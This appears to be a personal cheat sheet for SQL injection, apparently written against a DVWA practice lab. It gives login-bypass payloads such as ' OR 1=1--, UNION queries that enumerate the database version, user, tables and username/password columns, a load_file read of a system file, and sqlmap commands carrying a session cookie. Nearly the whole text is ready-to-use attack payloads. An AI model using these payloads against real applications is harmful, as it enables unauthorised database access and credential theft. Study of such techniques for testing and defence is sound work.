# start first with
Try to only put ' or “ in
try ``'`` in fields to check how it behaves

# if the first step works go with injection

``select * from users where email='$email' and password='pw'``
//ends with comment (``--``) to ignore rest  
``select * from users where email=' ' OR 1=1--' and password='pw' ``
2) ' OR 1=1--
3) ' OR 1=1; --
4) ' OR 1=1;#

## enumerate db
``id=1 order by 1``
* Then you can enumerate user automatically one by one

## union
//to get version
``id=1 union all select 1,2, @@version``
//to get database user
``id=1 union all select 1,2, user()``

//to get table schemas and treive some intersting column name
``id=1 union all select 1,2, table_name from information_schema.tables``
//column name for instance "users"
``id=1 union all select 1,2, table_name from information_schema.tables where table_Name='users'``

//we then for instance see columns usernames and passwords, can tackle it with:
``id=1 union all select 1,username,password from users``

# code execution to read and write files in the system
``id=1 union all select 1,2, load_file('C:/Windows/System32/drivers/etc/hosts')``

# sqlmap 

``sqlmap -cookie="security=high; PHPSESSID=a3a6968ac0cb1775f890061af0b42108"" -u “http://192.168.0.6/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#”``
* to just run in mysql and not maria db
``sqlmap -u “http://192.168.0.6/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#” --dbms=mysql``

* better to sent request trough ZAP proxy save the request somehwere and the to run it with the file:
``sqlmap -r "/home/kali/Documents/sqlinj.raw"``

* enumerate all sql tables to get an full reports of them
``sqlmap -r "/home/kali/Documents/sqlinj.raw" --tables``
